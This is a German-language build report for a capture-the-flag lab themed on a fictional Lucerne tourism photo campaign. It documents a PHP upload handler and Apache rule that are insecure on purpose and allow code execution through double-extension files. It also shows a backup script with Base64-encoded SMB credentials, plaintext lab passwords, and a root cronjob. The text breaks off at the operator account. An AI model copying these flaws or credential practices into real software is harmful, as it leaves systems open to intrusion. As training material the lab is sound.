# Einleitung

Dieser Report beschreibt den Aufbau und die Konfiguration des CTF mit dem Thema “Luzerner Tourismusbüro”. Grundlage bildet die fiktive Kampagne **#LuzernerMoments**, bei der Teilnehmer: innen schrittweise verschiedene Flags finden müssen. Der Report erklärt die Idee hinter dem Szenario und beschreibt die technischen Komponenten und den Aufbau der einzelnen Flags. Ausserdem wird in einem Lösungs Walkthrough gezeigt, wie die Aufgaben gelöst werden können und welche Zusammenhänge zwischen den einzelnen Schritten bestehen.

## Zweck und Ziele

Zweck dieses CTF ist es, die Spieler:innen in ein realistisches Szenario zu versetzen, in dem sie verschiedene Aufgaben zur Erkennung und Ausnutzung von Schwachstellen lösen können. Dazu gehören das Aufspüren und Testen von Web-Schwachstellen, das Entwickeln und Erproben einfacher Payloads, das Lösen vorgegebener Kryptochallenges sowie das Erlernen von Techniken zur Privilege Escalation.

**Geförderte Fähigkeiten**

- Web-Recon: Suche nach Hinweisen und Artefakten in Webanwendungen
- Finden, Verknüpfen und Bewerten von Hinweisen im System
- Ausnutzen von Schwachstellen in einer Webanwendung
- Craften und Testen einer Payload
- Lösen einer kryptographischen Challenge gemäss vorgegebenem Verschlüsselungsmechanismus
- Erhöhen von Berechtigungen durch Injection

## **#LuzernerMoments – Dein Blick auf unsere Stadt**

Die Stadt Luzern ruft zur Aktion **#LuzernerMoments** auf. Gesucht sind die eindrücklichsten Augenblicke aus Luzern: das goldene Licht über dem Vierwaldstättersee, die Kapellbrücke im Morgennebel, festliche Stimmung rund um das Luzerner Stadtfest oder die stille Aussicht vom Pilatus. Touristinnen, Touristen und Einheimische laden ihr persönliches Highlight Foto hoch und beschreiben in wenigen Sätzen, warum gerade dieser Moment zählt. Jede Woche werden kleine Preise vergeben – von Museumspässen bis Schifffahrt-Tickets. Am Ende kürt eine Jury das kreativste und stimmungsvollste Bild der Saison und vergibt den Hauptpreis: ein atemberaubendes Wochenende in Luzern mit Sonnenuntergangsfahrt auf dem Vierwaldstättersee, Fototour, Rooftop-Dinner und Hotelnacht.

Die Kampagne musste kurzfristig aufgesetzt werden, da sich Hochsaison und das Luzerner Stadtfest überschneiden. Die Stadt ist voller Gäste und genau jetzt sollen die stärksten Eindrücke eingefangen werden. Um das Momentum zu nutzen, wurde die Aktion in wenigen Tagen aufgesetzt, Partner wurden eingebunden und die Teilnahme über Social Media verbreitet.

![Logo.png](attachment:e9af3aae-3b89-4099-a449-bde72ed5d8f8:Logo.png)

## Voraussetzungen

Ein solides Grundverständnis von Webanwendungen und der HTTP-Kommunikation (z. B. GET/POST, Statuscodes, Formularparametern, Cookies/Sessions) wird erwartet, ebenso wie praktische Erfahrung mit Web Enumeration Tools . Ausserdem sollten die Spieler:innen sicher mit der Kommandozeile umgehen können und in der Lage sein, einfache Skripte in Bash oder Python zu verstehen sowie anzupassen, um kleinere Aufgaben zu bewältigen. Für die vorgesehenen Aufgaben reichen grundlegende Kenntnisse in Kryptographie, wie die Unterschiede zwischen symmetrisch und asymmetrisch, Hashfunktionen, Base64 etc. aus. Ein Basiswissen über Linux Filesystemrechte, Besitzer/Gruppen, sudo-Konfigurationen sowie SUID/SGID ist für Privilege Escalation Aufgaben erforderlich. Eine eigene Exploit-Entwicklung ist nicht notwendig.

# Challenge-Aufbau & Dokumentation

In diesem Kapitel wird der komplette Aufbau des CTF dokumentiert. Es beschreibt die verwendeten Komponenten, die Konfigurationen und die Entscheidungen, die zur Erstellung der einzelnen Flags geführt haben. Das Ziel ist es, die Nachvollziehbarkeit und Reproduzierbarkeit der Aufgaben zu gewährleisten.

## Installation & initiale Konfiguration

### Technische Spezifikationen

Die CTF-Umgebung besteht aus einer Ubuntu Server 24.04.3 LTS VM. Diese Serverversion wurde gewählt, weil sie eine stabile  Grundlage bietet und viele erforderliche Werkzeuge für die Entwicklung und Durchführung der Aufgaben bereits beinhaltet.

- https://ubuntu.com/download/server#manual-install-tab

Die VM befindet sich in einem **NAT-Netzwerk (10.0.2.0/24)**. Diese Konfiguration ermöglicht es, innerhalb des virtuellen Netzwerks mehrere Systeme zu betreiben, während gleichzeitig über NAT eine Internetverbindung zur Installation benötigter Pakete oder Updates hergestellt werden kann.

| **Technische Spezifikationen der VM** | **Wert** |
| --- | --- |
| Betriebssystem | Ubuntu Server 24.04.3 LTS |
| Arbeitsspeicher | 2048 MB |
| Prozessoren | 2 virtuelle CPUs |
| Virtuelle Festplatte | 30 GB |
| Netzwerk | NAT (10.0.2.0/24) |
| Hostname | lutourismus |
| Weitere Einstellungen | Standardkonfiguration (default) |

### Deaktivierung LVM & Anlegen Benutzerkonto

Bei der Installation wurde LVM (Logical Volume Management) bewusst deaktiviert. Für ein CTF-Szenario ist eine dynamische Speicherverwaltung nicht erforderlich, da die Umgebung statisch aufgebaut und inhaltlich klar definiert ist.

![Deaktivierung LVM](attachment:7e4de03a-0a0a-4e78-87f8-ec99803347d1:Konfiguration_LVM.png)

Während der Installation des Betriebssystems wurde ein Benutzerkonto angelegt, um die Grundkonfiguration des Systems vorzunehmen.  Hierfür wurde der Benutzer `konfigurator` mit dem Passwort `konfig123` erstellt.  Der Benutzer verfügt über sudo Rechte, um administrative Aufgaben während der Einrichtung ausführen zu können. Nachdem die Systemeinrichtung abgeschlossen und alle CTF-relevanten Komponenten vorbereitet waren, wurde das Konto gelöscht, da es für das Lösen des CTF nicht mehr benötigt wird.

### Netzwerkkonfiguration

Auf dem Server wurde die statische IP-Adresse **10.0.2.10** konfiguriert, damit das System im virtuellen Netzwerk eindeutig identifizierbar ist.  Die Konfiguration erfolgte über die Datei `/etc/netplan/50-cloud-init.yaml`, in der die Netzwerkschnittstelle mit einer statischen Adresse, Gateway und DNS Server definiert wurde. Nach Anpassung der Datei wurde die neue Netzwerkkonfiguration mit dem Befehl `sudo netplan apply` aktiviert.

```bash
konfigurator@lutourismus:~$ sudo nano /etc/netplan/50-cloud-init.yaml

network:
  version: 2
  ethernets:
    enp0s3:
      dhcp4: false
      addresses:
        - 10.0.2.10/24
      routes:
        - to: default
          via: 10.0.2.1
      nameservers:
        addresses:
          - 192.168.1.1

konfigurator@lutourismus:~$ sudo netplan apply
```

### Installation OpenSSH

Sowohl für die Einrichtung als auch für die CTF Challenge wurde **OpenSSH** installiert, um eine Remoteverbindung zum System zu ermöglichen und die Verwaltung direkt über SSH durchführen zu können.

```bash
konfigurator@lutourismus:~$ sudo apt update
konfigurator@lutourismus:~$ sudo apt install openssh-server
konfigurator@lutourismus:~$ sudo systemctl enable ssh
konfigurator@lutourismus:~$ sudo systemctl status ssh
● ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/usr/lib/systemd/system/ssh.service; enabled; preset: enabled)
     Active: active (running) since Sat 2025-10-11 09:28:26 UTC; 2min 14s ago
TriggeredBy: ● ssh.socket
       Docs: man:sshd(8)
             man:sshd_config(5)
   Main PID: 7257 (sshd)
      Tasks: 1 (limit: 2267)
     Memory: 1.2M (peak: 1.5M)
        CPU: 90ms
     CGroup: /system.slice/ssh.service
             └─7257 "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"

Oct 11 09:28:26 lutourismus sshd[7257]: Server listening on 0.0.0.0 port 22.
Oct 11 09:28:26 lutourismus sshd[7257]: Server listening on :: port 22.
Oct 11 09:28:26 lutourismus systemd[1]: Started ssh.service - OpenBSD Secure Shell server.
```

### Aktivierung root

Die Entwickler von Ubuntu haben beschlossen, das administrative Root Konto in Standardinstallationen zu deaktivieren. Stattdessen wird für administrative Aufgaben `sudo` verwendet (siehe [Ubuntu Dokumentation](https://documentation.ubuntu.com/) ). Nach der Installation wurde das Root Konto aktiviert, indem ein Passwort gesetzt wurde. Das Passwort besitzt eine ausreichende Länge und Komplexität, sodass es nicht durch eine einfache Brute-Force Attacke erraten werden kann.

- Username: `root`
- Password:  `lOREHS990RjU19cQN1V3eIKFNQV4V3`

```bash
konfigurator@lutourismus:~$ sudo passwd root
New password: 
Retype new password: 
passwd: password updated successfully
```

### Offene Ports

Folgende Ports sind auf der VM geöffnet.

| Port | Service | Status |
| --- | --- | --- |
| 22 | SSH | Open |
| 80 | HTTP | Open |
| 445, 139 | SMB | Open |

## Flag Übersicht

Die folgende Tabelle zeigt eine Übersicht aller im CTF implementierten Flags, inklusive kurzer Hinweise und des Speicherorts.

| Flag | Pfad | Hinweise |
| --- | --- | --- |
| flag{initial_access_luzernermoments_83723} | /home/webflag/flag.txt | robots.txt, Upload-Formular, Fehlermeldungen |
| flag{operator_crypto_2025_7f4b9a} | /home/operator/operator.txt | /share/internalIT/DisasterRecovery.txt, /share/internalIT/TODO.txt |
|  |  |  |

## Flag 1:  Initial Access - Webseite

Im folgenden Kapitel wird der Aufbau des ersten Flags beschrieben. Durch das Lösen dieses Flags erhält der Spieler:in Initial Access zum System über eine Remote Code Execution (RCE) Schwachstelle in der Webanwendung.

### Einführung

Die Stadt Luzern hat kurzfristig eine Kampagne namens **#LuzernerMoments** gestartet, bei der Touristen und Einheimische ihre schönsten Fotos aus Luzern hochladen können. Aufgrund des Zeitdrucks wurde die Webanwendung schnell entwickelt, wobei Sicherheitsaspekte vernachlässigt wurden. Die Spieler:innen sollen die Schwachstellen in der Upload-Funktionalität identifizieren und ausnutzen, um Zugriff auf das System zu erlangen.

### Installation der Webseite

Die Webseite wird auf dem Ubuntu Server mit Apache2 und PHP 8.3 betrieben. Für die Installation wurde ein automatisiertes Bash-Skript (`install.sh`) erstellt, welches alle erforderlichen Komponenten installiert und konfiguriert.

Das Installations-Script führt folgende Schritte aus:

1. Aktualisierung der Paketlisten
2. Installation von Git (falls nicht vorhanden)
3. Klonen des Repositories von GitHub: https://github.com/Flurin17/cyberwars
4. Installation von Apache2 und PHP
5. Kopieren der Website-Dateien nach `/var/www/html`
6. Erstellung der Verzeichnisstruktur (`uploads/`, `data/`)
7. Setzen der korrekten Berechtigungen
8. Erstellung des System-Users `webflag`
9. Erstellung der Flag-Datei
10. Aktivierung und Start von Apache

```bash
konfigurator@lutourismus:~$ sudo bash install.sh
```

### Komponenten der Webanwendung

Die Webanwendung besteht aus folgenden Komponenten:

| **Datei** | **Beschreibung** |
| --- | --- |
| `index.php` | Hauptseite mit Upload-Formular und Kampagneninformation |
| `upload.php` | Upload-Handler mit Schwachstelle |
| `uploads/index.php` | Übersicht aller hochgeladenen Dateien |
| `thanks.php` | Bestätigungsseite nach erfolgreichem Upload |
| `config.php` | Ablenkung |
| `functions.php` | Hilfsfunktionen für Submission-Verwaltung |
| `assets/style.css` | Stylesheet für modernes Design |
| `robots.txt` | Robots-Datei mit Hinweisen auf gesperrte Verzeichnisse |
| `.htaccess` | Apache-Konfiguration |
| `uploads/` | Verzeichnis für hochgeladene Dateien |
| `data/uploaded_files.txt` | TXT-Datei mit Submission-Logs |

### Implementierte Schwachstellen

Die Upload-Funktionalität in `upload.php` enthält mehrere absichtliche Sicherheitslücken:

#### 1. Dateiendungs-Check statt Inhaltsprüfung

Die Applikation prüft **nur die letzte Dateiendung** mit `pathinfo()` und akzeptiert Uploads, wenn die Endung zu den erlaubten Formaten gehört (`.jpg`, `.jpeg`, `.png`, `.gif`). Es erfolgt **keine Prüfung der tatsächlichen Dateiinhalte** (Magic Bytes) oder des MIME-Types.

```php
$fileExtension = strtolower(pathinfo($originalName, PATHINFO_EXTENSION));

$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
if (!in_array($fileExtension, $allowedExtensions)) {
    die('Ungültiges Dateiformat. Erlaubt sind: JPG, JPEG, PNG, GIF');
}
```

Ein Angreifer kann eine Datei mit **Double-Extension** hochladen (z. B. `shell.php.jpg`). Die Funktion `pathinfo()` extrahiert nur die **letzte** Endung und prüft, ob diese in der erlaubten Liste enthalten ist. Eine Datei namens `shell.php.jpg` hat als letzte Endung `.jpg`, wird also akzeptiert, obwohl `.php` im Dateinamen enthalten ist.

#### 2. Verwendung des Original-Dateinamens

Die Applikation verwendet den **Original-Dateinamen** ohne ausreichende Bereinigung:

```php
$randomName = $originalName;
$uploadPath = UPLOAD_DIR . $randomName;
```

Statt den Dateinamen vollständig zu randomisieren oder die Dateiendung komplett zu entfernen, wird der hochgeladene Dateiname direkt übernommen. Dies ermöglicht es einem Angreifer, gezielt Dateinamen zu wählen, die `.php` enthalten (z. B. `shell.php.jpg`), und diese Dateien später einfach zu finden, da der Name bekannt ist.

In einer sicheren Implementierung würde:
- Ein komplett neuer, zufälliger Dateiname generiert werden
- Die originale Dateiendung vollständig entfernt werden
- Oder die Datei mit einer sicheren Endung wie `.txt` oder `.dat` gespeichert werden

#### 3. Uploads in ausführbares Web-Verzeichnis

Die hochgeladenen Dateien werden direkt in das Verzeichnis `uploads/` innerhalb des DocumentRoot gespeichert. Dieses Verzeichnis ist vom Webserver aus direkt erreichbar und **PHP-Code wird standardmässig ausgeführt**.

In einer sicheren Konfiguration würde:
- PHP-Ausführung im Upload-Verzeichnis deaktiviert sein
- Uploads ausserhalb des DocumentRoot gespeichert werden
- Eine strikte Content-Type-Prüfung erfolgen
- Magic-Byte-Validierung implementiert sein

#### 4. Apache-Konfiguration ermöglicht PHP-Execution

Die `.htaccess`-Datei enthält eine **kritische Fehlkonfiguration**, die es Apache erlaubt, Dateien mit `.php` im Namen als PHP auszuführen:

```apache
<FilesMatch ".+\.php">
    SetHandler application/x-httpd-php
</FilesMatch>
```

Diese Regel bewirkt, dass **jede Datei**, die `.php` **irgendwo** im Dateinamen enthält, vom Apache-Webserver als PHP-Code interpretiert und ausgeführt wird. Eine Datei mit dem Namen `shell.php.jpg` erfüllt diese Bedingung, da `.php` im Namen vorkommt, und wird daher trotz der `.jpg`-Endung als PHP-Skript behandelt.

In einer sicheren Konfiguration würde stattdessen die PHP-Ausführung im Upload-Verzeichnis komplett deaktiviert:

```apache
<Directory "/var/www/html/uploads">
    php_flag engine off
</Directory>
```

Dies würde die Ausführung von PHP-Code im Upload-Verzeichnis vollständig verhindern, unabhängig vom Dateinamen.

#### 5. Upload-Verzeichnis als improvisierte Galerie

Alle eingereichten Dateien werden direkt unter `/uploads/` abgelegt. Die Route `uploads/index.php` stellt eine einfache Übersicht der vorhandenen Uploads bereit und lebt im gleichen Verzeichnis wie die hochgeladenen Dateien. Die Seite ist nicht in der Hauptnavigation verlinkt; sie wird durch Enumeration (z. B. mit `gobuster dir -w /usr/share/wordlists/dirb/common.txt`) entdeckt, weil der Ordnername `uploads` Bestandteil der Wordlist ist. Das Dankes-Template verweist optional auf `/uploads/`, damit Teilnehmende nach einem Test-Upload die Oberfläche bequem erreichen können. Damit verbleibt der Discovery-Charakter, gleichzeitig erfolgt die Darstellung vollständig über das Upload-Verzeichnis.

### Erstellung System-User und Flag

Für das Flag wurde ein dedizierter System-User namens **`webflag`** erstellt, der keinen interaktiven Login besitzt:

```bash
konfigurator@lutourismus:~$ sudo useradd -r -m -s /usr/sbin/nologin webflag
```

Das Flag wurde in der Datei `/home/webflag/flag.txt` gespeichert und ist für alle Benutzer lesbar. **Wichtig:** Das Home-Verzeichnis `/home/webflag` muss für `www-data` zugänglich sein, damit die Flag nach erfolgreicher RCE gelesen werden kann:

```bash
root@lutourismus:~# echo "flag{initial_access_luzernermoments_83723}" > /home/webflag/flag.txt
root@lutourismus:~# chown webflag:webflag /home/webflag/flag.txt
root@lutourismus:~# chmod 444 /home/webflag/flag.txt
root@lutourismus:~# chmod 755 /home/webflag
root@lutourismus:~# ls -l /home/webflag/
total 4
-r--r--r-- 1 webflag webflag 43 Oct 19 2025 flag.txt
```

- **Flag:** `flag{initial_access_luzernermoments_83723}`
- **Pfad:** `/home/webflag/flag.txt`
- **Berechtigungen Flag:** `444` (alle können lesen, niemand kann schreiben)
- **Berechtigungen Home:** `755` (Verzeichnis für www-data zugänglich)

### Hinweise für Spieler:innen

Um die Spieler:innen in die richtige Richtung zu lenken, wurden folgende Hinweise implementiert:

1. **robots.txt**: Enthält Einträge für `/uploads/`, `/data/`, `/config/`, `/old/` und `/backup_smb.sh`, was auf interessante Verzeichnisse und Dateien hinweist. Der Hinweis auf `/uploads/` führt direkt zu der improvisierten Galerie.

2. **Upload-Formular**: Zeigt deutlich, welche Dateitypen akzeptiert werden (`JPG, JPEG, PNG, GIF`)

3. **Fehlermeldungen**: Geben klare Hinweise auf die Validierungslogik bei fehlerhaften Uploads

4. **Uploads-Verzeichnis (versteckt)**: Die Route `/uploads/` (bzw. `uploads/index.php`) ist nicht im Menü verlinkt, lässt sich aber mit gängigen Wordlists wie `/usr/share/wordlists/dirb/common.txt` finden und listet alle Uploads auf

5. **Decoy-Verzeichnisse**: `/old/` (Under Construction) und `/config/` (403 Forbidden) dienen als realistische Ablenkung und simulieren eine echte Webanwendung mit verschiedenen Bereichen

## Flag 2: Operator Access - Crypto Challenge

Im folgenden Kapitel wird der Aufbau des zweiten Flags beschrieben. Durch das Lösen dieses Flags erhält der Spieler:in in Zugriff auf den Operator Account, der über zusätzliche Rechte verfügt.

### Einführung

Nach dem Initial Access richtet sich die Suche auf ein Skript namens **`backup_smb.sh`**. Dieses Skript wird regelmässig per Cronjob ausgeführt und legt ein Backup der Upload-Daten auf dem internen, geschützten SMB-Share ab. In **`backup_smb.sh`** sind die Zugangsdaten für genau dieses geschützte Share *versehentlich* Base64-kodiert hinterlegt worden. Durch einfaches Dekodieren der Base64-Zeichenfolge erhält man das Passwort des SMB-Kontos und damit Zugriff auf den Share.

Auf dem geschützten Share findet man eine verschlüsselte Datei **`encrypted.enc`** sowie ein Python-Skript namens **`encrypt.py`** das zeigt, wie die Datei verschlüsselt wurde. In der Datei ist das Passwort des Operator Accounts verschlüsselt abgelegt als Disaster Recovery Backup. Ausserdem liegt eine kurze interne TODO-Notiz, welche erwähnt, dass während der Test-Phase temporäre Schlüsseldateien hinterlegt wurden und dass das Verzeichnis geprüft und bereinigt werden sollte. Die Spieler:innen müssen die Schlüssel finden, das Python-Skript analysieren, die einzelnen Verschlüsselungsschritte nachvollziehen und die Reihenfolge umkehren, um das ursprünglich verschlüsselte Passwort wiederherzustellen, etwa mit CyberChef oder einem kurzen eigenen Entschlüsselungsprogramm.

### Erstellung Systemaccount für SMB Zugriff

Für das Backupskript wird das Systemkonto **`backupsmb`** verwendet, das nur Zugriff auf den geschützten SMB-Share besitzt und **keinen interaktiven Login** auf dem System erlaubt. Er dient ausschliesslich dazu, Dateien auf den Share abzulegen.

```bash
konfigurator@lutourismus:~$ sudo adduser --system backupsmb
[sudo] password for konfigurator: 
info: Selecting UID from range 100 to 999 ...

info: Adding system user `backupsmb' (UID 110) ...
info: Adding new user `backupsmb' (UID 110) with group `nogroup' ...
info: Not creating `/nonexistent'.

konfigurator@lutourismus:/home$ getent passwd backupsmb
backupsmb:x:110:65534::/nonexistent:/usr/sbin/nologin
```

- `--system`: Erstellt einen Systembenutzer mit einer UID unter 1000, ohne Passwort, ohne Home-Verzeichnis und mit der Shell `/usr/sbin/nologin`. Der Benutzer kann sich nicht interaktiv anmelden und wird ausschliesslich für Dienste oder automatisierte Prozesse verwendet.

### Anlegen Gruppe für interne IT

Um die Zugriffsrechte auf die SMB-Freigabe gezielter steuern zu können, wurde eine Gruppe namens **`internalIT`** erstellt. Der Benutzer **`backupsmb`** wurde dieser Gruppe hinzugefügt, damit er über seine Gruppenzugehörigkeit auf die Freigabe zugreifen und die erforderlichen Lese- und Schreibvorgänge ausführen kann.

```bash
konfigurator@lutourismus:/$ sudo groupadd internalIT
[sudo] password for konfigurator: 
konfigurator@lutourismus:/$ sudo usermod -aG internalIT backupsmb
```

### Installation Samba

Samba wird verwendet, um auf dem Linux-Server SMB-Shares bereitzustellen und so den Dateizugriff über das Netzwerk zu ermöglichen. Auf dem Ubuntu Server wurde Samba (Version 4.19.5-Ubuntu) mit dem folgenden Befehlen installiert.

- https://ubuntu.com/tutorials/install-and-configure-samba#2-installing-samba
- https://www.dedicatedcore.com/blog/install-samba-ubuntu/

```bash
konfigurator@lutourismus:~$ sudo apt update
konfigurator@lutourismus:~$ sudo apt install samba -y
konfigurator@lutourismus:~$ whereis samba
samba: /usr/sbin/samba /usr/lib/x86_64-linux-gnu/samba /etc/samba /usr/libexec/samba /usr/share/samba /usr/share/man/man7/samba.7.gz /usr/share/man/man8/samba.8.gz
```

### Erstellung der Verzeichnisstruktur

Für die Freigaben wurde zunächst der Ordner `/share` angelegt. Innerhalb dieses Verzeichnisses befinden sich die beiden Unterordner `/share/internalIT` und `/share/public`. Zusätzlich wurde innerhalb von `/share/internalIT` der Unterordner `/share/internalIT/backup` erstellt, in dem das Backupskript die Upload-Dateien kopiert.

Im Ordner **`internalIT`** befinden sich die relevanten Dateien und Dokumente, die für das CTF von Bedeutung sind. Der Ordner **`public`** hingegen ist nicht CTF relevant; dort liegt lediglich eine Datei, die als Teil der Marketingkampagne dient und zur thematischen Gestaltung des CTF beiträgt.

Auf den Ordnern wurde das SGID-Bit gesetzt, um sicherzustellen, dass neu erstellte Dateien und Unterordner automatisch der Gruppe **`internalIT`** zugeordnet werden.

```bash
konfigurator@lutourismus:/$ su root
Password: 
root@lutourismus:/# mkdir share
root@lutourismus:/# mkdir /share/public
root@lutourismus:/# mkdir /share/internalIT
root@lutourismus:/# mkdir /share/internalIT/backup

root@lutourismus:/# sudo chown root:internalIT /share/public
root@lutourismus:/# sudo chmod 2775 /share/public
root@lutourismus:/# sudo chown root:internalIT /share/internalIT
root@lutourismus:/# sudo chmod 2770 /share/internalIT
root@lutourismus:/# sudo chown backupsmb:internalIT /share/internalIT/backup
root@lutourismus:/# sudo chmod 2750 /share/internalIT/backup

root@lutourismus:/# cd /share
root@lutourismus:/share# ls -l
total 8
drwxrws--- 3 root internalIT 4096 Oct 13 18:44 internalIT
drwxrwsr-x 2 root internalIT 4096 Oct 11 10:53 public

root@lutourismus:/share/internalIT# ls -l
total 4
drwxr-s--- 2 backupsmb internalIT 4096 Oct 13 17:49 backup
```

| **Ordner** | **Besitzer** | **Gruppe** | **Rechte** | **backupsmb** | **Mitglieder der Gruppe internalIT** | **Andere Benutzer** | **Beschreibung / Zugriff** |
| --- | --- | --- | --- | --- | --- | --- | --- |
| `/share/public` | root | internalIT | `drwxrwsr-x` (2775) | Schreiben/Lesen | Vollzugriff | Lesen | Öffentlich lesbar |
| `/share/internalIT` | root | internalIT | `drwxrws---` (2770) | Schreiben/Lesen | Vollzugriff | Kein Zugriff | Geschützter Bereich für die Gruppe internalIT |
| `/share/internalIT/backup` | backupsmb | internalIT | `drwxr-s---` (2750) | Vollzugriff | Nur Lesezugriff | Kein Zugriff | Backup Ordner, in dem backupsmb Dateien speichern kann |

### Anpassung Globale Variablen Samba

In der Samba Konfiguration wurde die Einstellung für die Netzwerkschnittstellen angepasst, damit der Dienst nicht nur lokal, sondern auch über die IP-Adresse des Servers erreichbar ist. 
Hier wurde die IP-Adresse des Ubutnu Servers **`10.0.2.10/24`** eingetragen.

```bash
konfigurator@lutourismus:~$ sudo nano /etc/samba/smb.conf
...
# The specific set of interfaces / networks to bind to
# This can be either the interface name or an IP address/netmask;
# interface names are normally preferred
;   interfaces = 127.0.0.0/8 10.0.2.10/24
...
```

### Konfiguration Samba Shares

Als Erstes wurde der **`print$`** Share aus der Samba Konfiguration entfernt, da dieser für das CTF nicht benötigt wird. Die Freigabe dient standardmässig zur Bereitstellung von Druckertreibern für Windows Clients.

```bash
# Windows clients look for this share name as a source of downloadable
# printer drivers
[print$]
   comment = Printer Drivers
   path = /var/lib/samba/printers
   browseable = yes
   read only = yes
   guest ok = no
```

In der Samba-Konfiguration wurden zwei Freigaben eingerichtet: **`public`** und **`internalIT`**. Die Freigabe **`public`** dient als öffentlich zugänglicher Bereich, auf den anonym (ohne Benutzername und Passwort) zugegriffen werden kann. Sie ist **read-only** konfiguriert, sodass Dateien nur gelesen, aber nicht verändert oder gelöscht werden können. Durch die Einstellung **browsable = yes** wird der Share beim Durchsuchen des Servers angezeigt, was die Auffindbarkeit im Netzwerk erleichtert.

Die zweite Freigabe **`internalIT`** ist für autorisierte Benutzer der Gruppe internalIT vorgesehen. Sie erlaubt Lese- und Schreibzugriff, sodass Mitglieder der Gruppe Dateien gemeinsam bearbeiten können. Auch hier ist **browsable = yes** aktiviert, damit die Freigabe im Netzwerk sichtbar ist. 

```bash
...
[public]
   comment = Öffentliche Freigabe
   path = /share/public
   browsable = yes
   guest ok = yes
   read only = yes

[internalIT]
   comment = Interner IT Share
   path = /share/internalIT
   browsable = yes
   writable = yes
   valid users = @internalIT
   create mask = 0660
   directory mask = 0770
```

### Aktivierung User für Samba

Damit der Benutzer **`backupsmb`** für den Zugriff auf den Share genutzt werden kann, musste zunächst ein separates Samba Passwort hinterlegt werden. Samba verwendet nämlich eine eigene Passwortdatenbank und greift **nicht automatisch auf die Systempasswörter** zu.

- Username: `backupsmb`
- Password: `yMTrTbAc56U2O80wTllY8Tg1mJJYOw`

```bash
konfigurator@lutourismus:~$ sudo smbpasswd -a backupsmb
```

### Erstellung Backupskript

Für die Erstellung der Backups wurde ein Bash-Skript erstellt, welches die Dateien aus dem Upload Verzeichnis sichert. Dabei wird der Inhalt des Quellordners zu einem `.tar.gz`-Archiv komprimiert und mit dem aktuellen Datum gekennzeichnet. Anschliessend überträgt das Skript das Archiv über den SMB-Client auf den SMB-Share. Das Skript liegt unter `/usr/local/sbin/backup_smb.sh`.

Im Skript sind der Benutzername und die Zugangsdaten des Benutzers **`backupsmb`** in **Base64** hinterlegt, über die die Verbindung zum SMB-Share hergestellt wird. Durch das Dekodieren erhalten die Spieler:innen Zugriff auf den **`internalIT`** Share und können dort weitere Dateien einsehen.

```bash
#!/bin/bash

SRC="/home/test"
DST="//10.0.2.10/internalIT"
LOG="/var/log/backup.log"
DATE=$(date +%Y-%m-%d_%H-%M-%S)
ARCHIVE="/tmp/uploads_$DATE.tar.gz"
RETENTION_DAYS=7

U=$(echo YmFja3Vwc21i | base64 -d)
P=$(echo eU1UclRiQWM1NlUyTzgwd1RsbFk4VGcxbUpKWU93 | base64 -d)

log_info()  { echo "[INFO]  $1"  >> $LOG; }
log_error() { echo "[ERROR] $1" >> $LOG; }

log_info "---------------------------------------------"
log_info "Backup process started at $(date)"

# Prüfen, ob Quellverzeichnis existiert
if [ ! -d "$SRC" ]; then
    log_error "Source directory $SRC not found!"
    exit 1
fi

# Prüfen auf mind. 500 MB freien Speicherplatz
FREE_SPACE=$(df --output=avail /tmp | tail -1)
if [ "$FREE_SPACE" -lt 512000 ]; then
    log_error "Not enough space in /tmp for backup archive!"
    exit 1
fi

# Backup erstellen
tar -czf "$ARCHIVE" -C "$(dirname "$SRC")" "$(basename "$SRC")" 2>> $LOG
if [ $? -ne 0 ]; then
    log_error "Error creating archive!"
    exit 1
fi
log_info "Archive created successfully: $ARCHIVE"

# Archiv in den Ordner 'backup' auf dem Share hochladen
smbclient "$DST" -U "${U}%${P}" -c "cd backup; put $ARCHIVE $(basename "$ARCHIVE")" 2>&1 | while read -r line; do
    log_info "$line"
done

if [ $? -eq 0 ]; then
    log_info "Backup uploaded successfully to internalIT/backup: $(basename "$ARCHIVE")"
    
    # Lokale Archivdatei nach erfolgreichem Upload löschen
    rm -f "$ARCHIVE"
    if [ $? -eq 0 ]; then
        log_info "Local archive deleted from /tmp: $(basename "$ARCHIVE")"
    else
        log_error "Failed to delete local archive: $(basename "$ARCHIVE")"
    fi
else
    log_error "Upload failed!"
    exit 1
fi

# Alte temporäre Backups löschen (Sicherheitsmaßnahme, falls alte übrig sind)
find /tmp -name "uploads_*.tar.gz" -type f -mtime +$RETENTION_DAYS -exec rm {} \; >> $LOG 2>&1
log_info "Old local backups older than $RETENTION_DAYS days removed."

log_info "Backup finished successfully at $(date)"
log_info "---------------------------------------------"
```

Die Datei darf nur von Root bearbeitet werden, kann jedoch von allen anderen Benutzern gelesen werden. Damit das Skript erfolgreich ausgeführt werden kann, musste zuvor der **SMB-Client** installiert werden. Zudem wurde das Execute Recht für das Skript gesetzt, damit es von root als Programm gestartet werden kann.

```bash
konfigurator@lutourismus:~$ sudo apt install smbclient -y
konfigurator@lutourismus:/usr/local/sbin$ sudo chmod 744 backup_smb.sh
konfigurator@lutourismus:/usr/local/sbin$ ls -l
total 4
-rwxr--r-- 1 root root 2012 Oct 11 13:46 backup_smb.sh
```

### Einrichten Cronjob für Backupskript

Ein Cronjob wurde eingerichtet, um das Backup-Skript regelmässig auszuführen. Der Cronjob ist im systemweiten Verzeichnis `/etc/cron.d/` abgelegt. Durch den Cronjob wird das Backupskript alle 12 Stunden automatisch mit root-Rechten ausgeführt. Der Wert `0` repräsentiert die Minute, `*/12` steht für alle zwölf Stunden und der Benutzer `root` bestimmt, dass der Job mit administrativen Rechten ausgeführt wird. Die Berechtigungen werden automatisch so gesetzt, dass die Cronjob Datei von allen Benutzern gelesen, jedoch nur von root bearbeitet werden kann.

- [https://www.strongdm.com/blog/set-up-cron-job-linux#:~:text=For system-wide cron jobs,choose your preferred text editor](https://www.strongdm.com/blog/set-up-cron-job-linux#:~:text=For%20system%2Dwide%20cron%20jobs,choose%20your%20preferred%20text%20editor)

```bash
konfigurator@lutourismus:~$ sudo nano /etc/cron.d/backup_smb
# Führt alle 12 Stunden das Backupskript aus
0 */12 * * * root /usr/local/sbin/backup_smb.sh

konfigurator@lutourismus:~$ ls -l /etc/cron.d
total 12
-rw-r--r-- 1 root root  94 Oct 11 15:46 backup_smb
...
```

### Erstellung Operator Account

Nach dem Lösen der Crypto Challenge erhält der Spieler:in Zugriff auf den **Operator Account**. Dieser Benutzer wird für die Privilege Escalation im dritten Flag verwendet, da er erweiterte Lese- und Schreibrechte auf bestimmte Dateien besitzt. Als Primärgruppe wurde **`internalIT`** festgelegt.

- Username: `operator`
- Password: `J5p57xAr4MrQ2LrcFzDILsbdQqUM0g`

```bash
